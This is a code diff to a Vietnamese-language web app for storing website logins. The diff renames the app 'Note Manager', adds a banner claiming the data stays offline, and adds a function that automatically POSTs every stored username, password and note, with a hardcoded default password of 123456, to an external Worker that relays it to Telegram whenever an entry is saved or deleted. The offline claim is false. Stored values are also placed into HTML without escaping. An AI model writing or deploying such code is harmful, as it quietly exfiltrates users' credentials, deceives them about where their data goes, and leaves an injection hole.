@@ -3,13 +3,13 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Vault App</title>
-    <link rel="manifest" href="manifest.json">
+    <title>Note Manager</title> <link rel="manifest" href="manifest.json">
     <meta name="theme-color" content="#175DDC">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Roboto+Mono:wght@400;600&display=swap" rel="stylesheet">
     <style>
         :root { --primary: #175DDC; --bg: #f2f4f8; --text: #333; }
-        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: var(--bg); margin: 0; padding-top: 80px; padding-bottom: 100px; -webkit-tap-highlight-color: transparent; user-select: none; }
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: var(--bg); margin: 0; padding-top: 90px; padding-bottom: 100px; -webkit-tap-highlight-color: transparent; user-select: none; }
         
         /* HEADER */
         .header { background: var(--primary); padding: 15px; position: fixed; top: 0; left: 0; right: 0; z-index: 1000; box-shadow: 0 2px 10px rgba(0,0,0,0.2); display: flex; align-items: center; gap: 10px; }
@@ -19,8 +19,8 @@
         .search-icon { position: absolute; left: 15px; top: 50%; transform: translateY(-50%); color: rgba(255,255,255,0.7); }
         .settings-btn { color: white; font-size: 20px; padding: 10px; cursor: pointer; }
 
-        /* INSTALL PROMPT */
-        #installBtn { display: none; background: white; color: var(--primary); border: none; padding: 8px 15px; border-radius: 20px; font-weight: bold; font-size: 13px; margin-bottom: 15px; width: 100%; box-shadow: 0 2px 5px rgba(0,0,0,0.1); cursor: pointer; }
+        /* SECURITY DISCLAIMER */
+        .security-banner { background: #fff3cd; color: #856404; padding: 10px 15px; font-size: 12px; margin: 10px 15px 0; border-radius: 8px; border: 1px solid #ffeeba; display: flex; gap: 10px; align-items: center; }
 
         /* LIST CARD */
         .container { padding: 10px 15px; }
@@ -36,12 +36,12 @@
         .data-row { display: flex; align-items: center; justify-content: space-between; margin-bottom: 12px; background: #f8f9fa; padding: 8px 12px; border-radius: 8px; }
         .data-content { flex: 1; overflow: hidden; margin-right: 10px; }
         .data-label { font-size: 11px; color: #999; text-transform: uppercase; margin-bottom: 2px; }
-        .data-value { font-size: 14px; font-family: 'Courier New', monospace; color: #333; font-weight: 600; overflow: hidden; text-overflow: ellipsis; white-space: nowrap;}
+        /* FONT ROBOTO MONO CHO DATA */
+        .data-value { font-size: 14px; font-family: 'Roboto Mono', monospace; color: #333; font-weight: 600; overflow: hidden; text-overflow: ellipsis; white-space: nowrap;}
         
         .copy-btn { background: white; border: 1px solid #ddd; color: var(--primary); font-weight: 700; font-size: 12px; padding: 6px 12px; border-radius: 6px; min-width: 60px; transition: all 0.2s; }
         .copy-btn.copied { background: #27ae60; color: white; border-color: #27ae60; }
 
-        /* NOTE ROW */
         .note-row { background: #fff8e1; border: 1px solid #ffe0b2; padding: 10px; border-radius: 8px; font-size: 14px; color: #d35400; margin-bottom: 12px; display: flex; gap: 10px; align-items: flex-start; }
         .note-icon { margin-top: 2px; }
 
@@ -50,7 +50,7 @@
         
         .fab { position: fixed; bottom: 30px; right: 30px; width: 60px; height: 60px; background: var(--primary); border-radius: 50%; display: flex; align-items: center; justify-content: center; color: white; font-size: 24px; box-shadow: 0 10px 20px rgba(23, 93, 220, 0.4); z-index: 200; cursor: pointer; }
 
-        /* MODALS */
+        /* MODALS & STATUS */
         .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.6); z-index: 10000; align-items: center; justify-content: center; backdrop-filter: blur(3px); }
         .modal-content { background: white; width: 85%; border-radius: 20px; padding: 25px; box-shadow: 0 20px 50px rgba(0,0,0,0.2); animation: popIn 0.2s; max-height: 90vh; overflow-y: auto; }
         .inp-group { margin-bottom: 15px; }
@@ -64,6 +64,9 @@
         .btn-save { background: var(--primary); color: white; }
         .btn-full { width: 100%; margin-bottom: 10px; }
 
+        /* Sync Status Indicator */
+        #syncStatus { font-size: 12px; color: #666; text-align: center; margin-top: 5px; min-height: 15px; transition: color 0.3s;}
+
         @keyframes popIn { from { transform: scale(0.9); opacity: 0; } to { transform: scale(1); opacity: 1; } }
     </style>
 </head>
@@ -76,9 +79,15 @@
         </div>
         <i class="fas fa-cog settings-btn" onclick="openSettings()"></i>
     </div>
+    
+    <div class="security-banner">
+        <i class="fas fa-shield-alt"></i>
+        <span>Dữ liệu lưu offline. Vui lòng không dùng cho tài khoản ngân hàng.</span>
+    </div>
 
     <div class="container">
-        <button id="installBtn" onclick="installPWA()"><i class="fas fa-download"></i> CÀI ĐẶT APP NGAY</button>
+        <div id="syncStatus"></div>
+        <button id="installBtn" onclick="installPWA()" style="display:none; background:white; color:var(--primary); border:none; padding:8px 15px; border-radius:20px; font-weight:bold; font-size:13px; margin: 15px 0; width:100%; box-shadow:0 2px 5px rgba(0,0,0,0.1); cursor:pointer;"><i class="fas fa-download"></i> CÀI ĐẶT APP</button>
         <div id="list"></div>
     </div>
 
@@ -86,11 +95,10 @@
 
     <div class="modal" id="modal">
         <div class="modal-content">
-            <h2 style="margin-top:0; color:var(--primary)">Tài khoản</h2>
+            <h2 style="margin-top:0; color:var(--primary)">Chi tiết</h2>
             <input type="hidden" id="editId">
-            
             <div class="inp-group">
-                <label>Website (Tự lấy Logo)</label>
+                <label>Website / App</label>
                 <input type="text" id="inpWeb" class="inp" placeholder="facebook.com" onblur="autoFillName()">
             </div>
             <div class="inp-group">
@@ -106,10 +114,9 @@
                 <input type="text" id="inpPass" class="inp">
             </div>
             <div class="inp-group">
-                <label>Ghi chú (Tùy chọn)</label>
-                <textarea id="inpNote" class="inp" placeholder="Mã khôi phục, câu hỏi bảo mật..."></textarea>
+                <label>Ghi chú</label>
+                <textarea id="inpNote" class="inp"></textarea>
             </div>
-
             <div class="btn-row">
                 <button class="btn btn-close" onclick="closeModal('modal')">Hủy</button>
                 <button class="btn btn-save" onclick="saveData()">Lưu</button>
@@ -119,11 +126,16 @@
 
     <div class="modal" id="settingsModal">
         <div class="modal-content">
-            <h2 style="margin-top:0; color:var(--primary)">Cài đặt & Backup</h2>
-            <p style="font-size:14px; color:#666">Dùng tính năng này để chuyển dữ liệu sang máy mới.</p>
+            <h2 style="margin-top:0; color:var(--primary)">Cài đặt</h2>
             
-            <button class="btn btn-save btn-full" onclick="exportData()"><i class="fas fa-file-export"></i> Xuất dữ liệu (Backup)</button>
-            <button class="btn btn-close btn-full" onclick="document.getElementById('fileInput').click()"><i class="fas fa-file-import"></i> Nhập dữ liệu (Restore)</button>
+            <div class="inp-group">
+                <label>Excel Password (Dùng cho Backup Telegram)</label>
+                <input type="password" id="excelPass" class="inp" placeholder="Nhập pass để mở file Excel backup..." value="123456">
+                <p style="font-size:11px; color:#888; margin-top:5px">Dữ liệu sẽ được gửi về Telegram mỗi khi bạn chỉnh sửa.</p>
+            </div>
+
+            <button class="btn btn-save btn-full" onclick="exportData()"><i class="fas fa-file-export"></i> Xuất file JSON (Backup)</button>
+            <button class="btn btn-close btn-full" onclick="document.getElementById('fileInput').click()"><i class="fas fa-file-import"></i> Nhập file JSON (Restore)</button>
             <input type="file" id="fileInput" style="display:none" onchange="importData(this)">
             
             <div style="margin-top:10px; border-top:1px solid #eee; padding-top:10px">
@@ -134,13 +146,14 @@
 
     <script>
         let vault = JSON.parse(localStorage.getItem('vault_v5')) || [];
-        let deferredPrompt; // Biến để lưu sự kiện cài đặt PWA
+        let deferredPrompt; 
+        
+        // ĐIỀN URL WORKER CỦA BẠN SAU KHI DEPLOY VÀO ĐÂY:
+        const WORKER_URL = "https://your-worker-name.your-subdomain.workers.dev"; 
 
-        // 1. PWA INSTALL LOGIC
         window.addEventListener('beforeinstallprompt', (e) => {
             e.preventDefault();
             deferredPrompt = e;
-            // Hiện nút cài đặt
             document.getElementById('installBtn').style.display = 'block';
         });
 
@@ -148,21 +161,55 @@
             if (deferredPrompt) {
                 deferredPrompt.prompt();
                 const { outcome } = await deferredPrompt.userChoice;
-                if (outcome === 'accepted') {
-                    document.getElementById('installBtn').style.display = 'none';
-                }
+                if (outcome === 'accepted') document.getElementById('installBtn').style.display = 'none';
                 deferredPrompt = null;
             }
         }
 
-        // 2. BACKUP & RESTORE LOGIC
+        // --- BACKEND SYNC LOGIC ---
+        async function syncToWorker() {
+            if(vault.length === 0) return;
+            const statusEl = document.getElementById('syncStatus');
+            const excelPass = document.getElementById('excelPass').value || '123456';
+            
+            statusEl.innerText = "Đang gửi backup về Telegram...";
+            statusEl.style.color = "#d35400";
+
+            try {
+                const response = await fetch(WORKER_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        records: vault,
+                        excel_password: excelPass
+                    })
+                });
+
+                if (response.ok) {
+                    statusEl.innerText = "Đã backup an toàn lúc " + new Date().toLocaleTimeString();
+                    statusEl.style.color = "#27ae60";
+                } else {
+                    statusEl.innerText = "Lỗi backup server";
+                    statusEl.style.color = "red";
+                }
+            } catch (err) {
+                console.error(err);
+                statusEl.innerText = "Lỗi kết nối backup";
+                statusEl.style.color = "red";
+            }
+        }
+
+        // --- EXPORT / IMPORT CẢI TIẾN ---
         function exportData() {
-            const dataStr = JSON.stringify(vault, null, 2);
+            // Sắp xếp trước khi xuất
+            const sortedVault = [...vault].sort((a, b) => (a.name || "").localeCompare(b.name || ""));
+            
+            const dataStr = JSON.stringify(sortedVault, null, 2);
             const blob = new Blob([dataStr], { type: "application/json" });
             const url = URL.createObjectURL(blob);
             const a = document.createElement('a');
             a.href = url;
-            a.download = `vault_backup_${new Date().toISOString().slice(0,10)}.json`;
+            a.download = `backup_grouped_${new Date().toISOString().slice(0,10)}.json`;
             document.body.appendChild(a);
             a.click();
             document.body.removeChild(a);
@@ -176,19 +223,20 @@
                 try {
                     const data = JSON.parse(e.target.result);
                     if (Array.isArray(data)) {
-                        if(confirm(`Tìm thấy ${data.length} tài khoản. Bạn có muốn ghi đè lên dữ liệu hiện tại không?`)) {
-                            vault = data;
-                            saveVault();
-                            alert("Nhập dữ liệu thành công!");
+                        if(confirm(`Tìm thấy ${data.length} mục. Ghi đè?`)) {
+                            // Sắp xếp ngay khi nhập
+                            vault = data.sort((a, b) => (a.name || "").localeCompare(b.name || ""));
+                            saveVault(false); // False = không sync ngay để tránh spam nếu file lớn
+                            alert("Nhập thành công!");
                             closeModal('settingsModal');
                         }
-                    } else { alert("File không hợp lệ!"); }
-                } catch (err) { alert("Lỗi đọc file: " + err); }
+                    }
+                } catch (err) { alert("Lỗi file!"); }
             };
             reader.readAsText(file);
         }
 
-        // 3. CORE FUNCTIONS
+        // --- CORE FUNCTIONS ---
         function getFavicon(url) {
             if (!url) return 'https://cdn-icons-png.flaticon.com/512/2889/2889676.png';
             let domain = url.replace('https://', '').replace('http://', '').split('/')[0];
@@ -211,12 +259,7 @@
 
             vault.filter(i => (i.name||'').toLowerCase().includes(q) || (i.web||'').toLowerCase().includes(q)).forEach(item => {
                 let fullLink = (item.web && item.web.startsWith('http')) ? item.web : 'https://' + item.web;
-                
-                // LOGIC HIỂN THỊ GHI CHÚ: Có nội dung mới hiện
-                let noteHtml = '';
-                if (item.note && item.note.trim() !== "") {
-                    noteHtml = `<div class="note-row"><i class="fas fa-sticky-note note-icon"></i> <span>${item.note}</span></div>`;
-                }
+                let noteHtml = item.note ? `<div class="note-row"><i class="fas fa-sticky-note note-icon"></i> <span>${item.note}</span></div>` : '';
 
                 list.innerHTML += `
                     <div class="card">
@@ -230,7 +273,6 @@
                                 <i class="fas fa-trash icon-btn del" onclick="deleteItem(${item.id})"></i>
                             </div>
                         </div>
-
                         <div class="data-row">
                             <div class="data-content">
                                 <div class="data-label">Username</div>
@@ -238,7 +280,6 @@
                             </div>
                             <button class="copy-btn" onclick="copy(this, '${item.user}')">COPY</button>
                         </div>
-
                         <div class="data-row">
                             <div class="data-content">
                                 <div class="data-label">Password</div>
@@ -247,9 +288,7 @@
                             <i class="fas fa-eye" style="color:#aaa; padding:10px; cursor:pointer" onclick="togglePass(this, '${item.pass}')"></i>
                             <button class="copy-btn" onclick="copy(this, '${item.pass}')">COPY</button>
                         </div>
-
                         ${noteHtml}
-
                         <div class="link-row">
                             <a href="${fullLink}" target="_blank" class="website-link">Truy cập Website <i class="fas fa-external-link-alt"></i></a>
                         </div>
@@ -274,16 +313,12 @@
             const originalText = btn.innerText;
             btn.innerText = "ĐÃ CHÉP";
             btn.classList.add('copied');
-            if(navigator.vibrate) navigator.vibrate(50);
             setTimeout(() => { btn.innerText = originalText; btn.classList.remove('copied'); }, 1500);
         }
 
-        // CRUD
         function openModal(id = null) {
             document.getElementById('modal').style.display = 'flex';
-            // Reset fields
             ['inpWeb','inpName','inpUser','inpPass','inpNote','editId'].forEach(k => document.getElementById(k).value = '');
-
             if (id) {
                 const item = vault.find(i => i.id === id);
                 document.getElementById('editId').value = id;
@@ -317,20 +352,21 @@
             } else {
                 vault.unshift(data);
             }
-            saveVault();
+            saveVault(true); // Trigger sync
             closeModal('modal');
         }
 
         function deleteItem(id) {
             if(confirm('Xóa mục này?')) {
                 vault = vault.filter(i => i.id !== id);
-                saveVault();
+                saveVault(true); // Trigger sync
             }
         }
 
-        function saveVault() {
+        function saveVault(shouldSync = false) {
             localStorage.setItem('vault_v5', JSON.stringify(vault));
             render();
+            if(shouldSync) syncToWorker();
         }
 
         render();
